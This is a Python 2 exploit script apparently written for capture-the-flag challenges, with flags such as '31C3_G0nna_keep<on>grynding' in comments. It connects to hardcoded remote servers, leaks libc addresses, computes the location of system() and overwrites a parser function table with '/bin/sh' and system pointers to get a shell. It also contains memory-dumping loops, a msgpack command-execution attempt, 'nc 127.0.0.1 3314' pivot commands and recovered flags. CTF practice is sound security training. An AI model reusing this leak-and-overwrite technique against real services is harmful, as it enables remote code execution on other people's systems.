__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop

'''
ip: booty.9447.plumbing
port: 9447
'''
def sarge():
    '''
    sarge running on 188.40.18.82 1234
    '''
    import msgpack
    import array

    class Sargecmd:
        def __init__(self, data):
            self.command = data
        def run(self):
            print self.command

    def objecthook(code, data):
        if code == 42:
            return Sargecmd(data)
        return msgpack.ExtType(code, data)

    msgpack_string = {"authentication":"s3cr3t","execute":msgpack.ExtType(42,'ls -l'),"zzzzz":'aa'}
    msgpack_object = msgpack.packb(msgpack_string)
    data = msgpack.unpackb(msgpack_object, ext_hook = objecthook)
    data["execute"].run()
    print data
    print len(msgpack_object)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "188.40.18.82"
    local_host="192.168.248.136"
    port = 1234
    local_port = 9446
    print 'Test remote ...'
    # socat TCP-LISTEN:9446,reuseaddr,fork EXEC:"python server.py"
    s.connect((host, port))
    #s.connect((local_host, local_port))
    #print msgpack_object
    s.send(msgpack_object+'\n')
    print msgpack_object.encode('hex')
    #print s.recv(1000)
    final_interact(s)
#sarge()

def maze():
    '''
    Where do you want to go (today)?

    nc 188.40.18.71 1234
    '''

def mynx():
    '''
    mynx running on 188.40.18.80 1234
    '''
    INVERT_FILTER = 0
    LOLOLO_FILTER = 1
    INVERSION_FILTER = 2

    ADD_COMMENT = 1
    REMOVE_ALL_COMMENTS = 2
    APPLY_FILTER = 3
    BACK = 0

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "188.40.18.80"
    local_host="192.168.248.136"
    port = 1234
    s.connect((host, port))

    def add_ascii_art(data,filter):
        s.send('1\n')
        print recv_until(s,'> ')
        s.send(str(filter)+'\n')
        print recv_until(s, '>>> ')
        s.send(data+'\n')

    def browser_ascii_art():
        s.send('2\n')
        data = recv_until(s, '> ')
        return data

    def select_ascii_art():
        s.send('3\n')
        print recv_until(s, '> ')   # print menu




def cfy():
    '''
    cfy running on 188.40.18.73 3313
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "188.40.18.73"
    #host="192.168.248.136"
    port = 3313
    s.connect((host, port))

    input_address = 0x06010E0
    parser_address = 0x601080
    fgets_address = 0x0601030

    system_delta = 0x44B30
    fgets_delta = 0x06ED90
    #raw_input('enter to ...')

    # dump printf
    print recv_until(s, '3) quit\n')
    s.send('2\n')
    print recv_until(s, 'Please enter your number: ')
    data = pq(fgets_address)+pq(input_address+8)+pq(fgets_address)
    s.send(data+'\n')

    recv_data = recv_until(s,'\n')
    #print recv_data
    base_address = int(recv_data[5:])-fgets_delta
    system_address = base_address + system_delta
    bin_sh_string = '/bin/sh\x00'
    data2 = bin_sh_string + 'a'*(0x10-len(bin_sh_string)) + pq(system_address)*0x40

    #print recv_until(s, '3) quit\n')
    recv_until(s, '3) quit\n')
    index1 = (input_address - parser_address + 0x40)/0x10
    s.send(str(index1)+'\n')
    print recv_until(s, 'Please enter your number: ')
    s.send(data2+'\n')
    time.sleep(0.01)
    s.send('uname -a\n')

    # cfy2 ....................................
    return s

#s = cfy()
def dump_mem(s, address_to_dump):
    s.send('2\n')
    recv_until(s, 'Please enter your number: ')
    data = pq(address_to_dump)
    s.send(data+'\n')

def dump(s, base_add, silent=1, stt=0):
    data = ''
    try:
        t = base_add
        if silent == 1:
            print ('[-]' + str(hex(stt))+' '+str(hex(t))+' ').ljust(100, '-')
        recv_until(s, '3) quit\n')
        dump_mem(s, t)
        recv_data = recv_until(s,'\n')
        recv_data = recv_until(s,'\n')
        temp1 = recv_data[7:]
        if silent == 1:
            beauty_print(pq(int(temp1,16)))
        data += pq(int(temp1,16))
        #time.sleep(0.001)
    except:
        print 'time out ....'
        pass

    return data

def cfy2_brute_system():

    s = cfy()
    mprotect_address = 0x602280
    real_ = 0x070+228*0x1000
    mprotect_ = 0x070
    input_address = 0x602360
    parser_address = 0x6022c0
    system_delta = 0x004215F
    printf_delta = 0x051269
    s.send('nc 127.0.0.1 3314\n')
    print recv_until(s, '3) quit\n')

    dump_mem(s, mprotect_address)  # 0x7faf92f8b070L
    recv_data = recv_until(s,'\n')
    temp_address = int(recv_data[5:])
    print '[+] ' + str(hex(temp_address))

    libc_start_main_got = 0x602240
    libc_base = uq(dump(s, libc_start_main_got)) - 0x234a5
    print '[+]', hex(libc_base)
    print '[+]', hex(libc_base + 0x3A3A48)
    print '[+]', hex(uq(dump(s,(libc_base + 0x3A3A48))))

    base_libc = temp_address-mprotect_-228*0x1000
    print '\n[+] '+hex(base_libc)
    print '[+] '+hex(base_libc+system_delta)

    region_list_delta = 0x03A0E70
    print '\n[+] address _rtld_global_ro_ptr: ...'
    data = dump(s, base_libc+region_list_delta)
    _rtld_global_ro_address = uq(data)
    print hex(_rtld_global_ro_address)

    print '\n[+] system list ...'
    _rtld_global_ro_address += 0x128
    data = dump(s, _rtld_global_ro_address)
    system_list = uq(data)
    print hex(system_list)

    print '\n[+] print system list element ...'

    while 1:
        print hex(system_list)+': ',
        system_list_next = 0
        for i in xrange(4):
            t = system_list+i*0x8
            data_temp = dump(s, t, 0, i)
            print(hex(uq(data_temp)))+'\t',
            if i==3:
                system_list_next=uq(data_temp)
        print ''

        for i in xrange(0x104):
            t = system_list+i*0x8+0x20
            data_temp = dump(s, t, 0, i)
            print hex(t)+': ',
            print(hex(uq(data_temp))) + ' => ' + (hex(uq(data_temp)-base_libc))

        system_list = system_list_next
        if system_list == 0:
            print '[+] end print element ...'
            break

    print '\n[+] print parser'
    parser = 0x6022f0
    for i in xrange(3):
        print hex(parser),
        t=parser+i*8
        for j in xrange(2):
            t = uq(dump(s, t, 0, i))
            print ' => '+hex(t),
        print ''

    exit(0)
    '''
    0x7f754bb92000
    0x7f754bb90000
    0x7f754bb8f000

    0x7f754b971a48
    '''
    # print binary cfy2
    base_libc = 0x400000 #0x400000
    range_search = 0x140
    data_400000 = ''
    try:
        for j in range(0, range_search):
            t = base_libc+j*0x8
            data_temp = dump(s, t, j)
            data_400000 += data_temp
    except:
        pass
    beauty_print(data_400000)
    print '+'*100
    base_libc = 0x400b00
    range_search = 0x250
    data_400b00 = ''
    try:
        for j in range(0, range_search):
            t = base_libc+j*0x8
            data_temp = dump(s, t, j)
            data_400b00 += data_temp
    except:
        pass
    beauty_print(data_400b00)

def real_exp():

    s = cfy()
    mprotect_address = 0x602280
    real_ = 0x070+228*0x1000
    mprotect_ = 0x070
    input_address = 0x602360
    parser_address = 0x6022c0
    system_delta = 0x004215F
    printf_delta = 0x051269
    s.send('nc 127.0.0.1 3314\n')
    print recv_until(s, '3) quit\n')

    dump_mem(s, mprotect_address)  # 0x7faf92f8b070L
    recv_data = recv_until(s,'\n')
    temp_address = int(recv_data[5:])
    print '[+] ' + str(hex(temp_address))

    base_libc = temp_address-mprotect_-228*0x1000
    print '[+] '+hex(base_libc)
    print '[+] '+hex(base_libc+system_delta)

    libc_dlopen = base_libc + 0x3A3A48


#31C3_no0ne_sQlves_Th1s=anyway=
'''
khai thac khi tim thay loi

    system_address = base_libc + system_delta
    printf_address = base_libc + printf_delta
    bin_sh_string = '/bin/sh\x00'
    data2 = bin_sh_string + 'a'*(0x10-len(bin_sh_string)) + pq(printf_address)*4+pq(0x602360+0x20)*0x40
    recv_until(s, '3) quit\n')
    index1 = (input_address - parser_address + 0x80)/0x10
    print hex(index1)
    s.send(str(index1)+'\n')
    print recv_until(s, 'Please enter your number: ')
    s.send(data2+'\n')
    time.sleep(0.01)
'''

'''
    begin_range = 0x30000
    range_search = 0x2000
    t=''
    recv_until(s, '3) quit\n')
    dump_mem(s, base_libc)
    recv_data = recv_until(s,'\n')
    recv_data = recv_until(s,'\n')
    temp1 = recv_data[7:]
    beauty_print(pq(int(temp1,16)))

    base_libc = 0x400000+0x00000400
    range_search = 0x400
    data = ''
    for j in range(0, range_search):
        t = base_libc+j*0x8
        print ('[-]' + str(hex(j)) + ' '+str(hex(begin_range+j*0x8))+' ' + str(hex(t))+' ').ljust(100, '-')
        recv_until(s, '3) quit\n')
        dump_mem(s, t)
        recv_data = recv_until(s,'\n')
        recv_data = recv_until(s,'\n')
        temp1 = recv_data[7:]
        beauty_print(pq(int(temp1,16)))
        data += pq(int(temp1,16))
        #time.sleep(0.001)


    beauty_print(data)
    write_file('libcdump',data)
'''
'''
TIM BASE CUA LIBC
    loop = 0x100
    for j in range(0xd0, loop):
        t = temp_address-mprotect_-j*0x1000
        print ('[-]' + str(j) + ' ' + str(hex(t))+' ').ljust(100, '-')
        recv_until(s, '3) quit\n')
        dump_mem(s, t)
        recv_data = recv_until(s,'\n')
        recv_data = recv_until(s,'\n')
        temp1 = recv_data[7:]
        beauty_print(pq(int(temp1,16)))
        time.sleep(0.01)
        print '[-]'.ljust(100, '-')
    time.sleep(0.1)
'''

cfy2_brute_system()

def cfy2(max_loop,input_address):
    '''
    1) Pwn cfy 2) nc 127.0.0.1 3314
    '''
    count = 0
    while count <= max_loop:
        temp_address = input_address+8*count
        s = cfy()
        print '==========================================================='
        print hex(temp_address),
        print count
        s.settimeout(7)
        s.send('nc 127.0.0.1 3314\n')
        try:
            print recv_until(s, '3) quit\n')
            dump_mem(s,temp_address)
            print recv_until(s, '3) quit\n')
            #print s.recv(1000)
        except:
            pass
        count+=1
        print '=============================        END =================='

def test_one():
    input_address = 0x602360   # khong chinh xac - doan bua thoi
    max_loop = 1
    cfy2(max_loop, input_address)
#test_one()
def loop_all():
    input_address = 0x400600   # khong chinh xac - doan bua thoi
    max_loop = 20
    cfy2(max_loop, input_address)
#loop_all()
'''
fgets
Please enter your number:
dec: 140448751778976
hex: 0x7fbcc5f57ca0

puts
Please enter your number:
dec: 140106637306176
hex: 0x7f6d1e58e940

31C3_G0nna_keep<on>grynding
'''

